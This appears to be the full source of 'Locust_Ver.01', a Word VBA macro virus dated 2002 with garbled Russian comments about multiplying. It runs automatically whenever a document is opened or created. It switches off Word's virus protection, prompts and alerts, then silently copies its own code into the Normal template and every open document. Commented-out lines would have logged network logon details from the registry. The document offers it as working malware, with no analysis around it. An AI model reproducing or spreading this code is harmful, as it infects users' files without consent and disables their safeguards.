   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Áîðîòüñÿ è èñêàòü
   'Íàéòè è ...ðàçìíîæàòüñÿ!!!
   '6/10/02
   'Locust_Ver.01
   Private Sub Main()
   Dim i, k As Byte
   On Error Resume Next
   'Open "c:\Locust_rep.txt" For Append As #1
   'Print #1, Date; "_"; System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "username")
   'Print #1, "/"; System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "PrimaryProvider")
   'Print #1, "/"; System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "LMLogon")
   Application.Options.VirusProtection = False
   Application.Options.SaveNormalPrompt = False
   Application.Options.SavePropertiesPrompt = False
   Application.ScreenUpdating = False
   Application.DisplayAlerts = False
   Application.EnableCancelKey = xlDisabled
      With Application.NormalTemplate.VBProject.VBComponents(1).CodeModule
        If .Find("ðàçìíîæàòüñÿ", 1, 1, 4, 25, True, False) = False Then
          .InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines)
          .ReplaceLine 3, "'" & Date
          Application.NormalTemplate.Save
          'Print #1, "/"; "Normal"
        End If
      End With
      For i = 1 To Application.Documents.Count
        With Application.Documents(i).VBProject.VBComponents(1).CodeModule
          If .Find("ðàçìíîæàòüñÿ", 1, 1, 4, 25, True, False) = False Then
            .InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines)
            .ReplaceLine 3, "'" & Date
            'Documents(i).WritePassword = "1"
            Application.Documents(i).SaveAs (Documents(i).Path + Documents(i).Name)
            'Print #1, "/"; Documents(i).Name
          End If
        End With
      Next i
     'Close #1
     Application.ScreenUpdating = True
     Application.DisplayAlerts = True
     Application.EnableCancelKey = xlInterrupt
   End Sub
   Private Sub Document_New()
     On Error Resume Next
     Main
   End Sub
   Private Sub Document_Open()
     On Error Resume Next
     Main
   End Sub
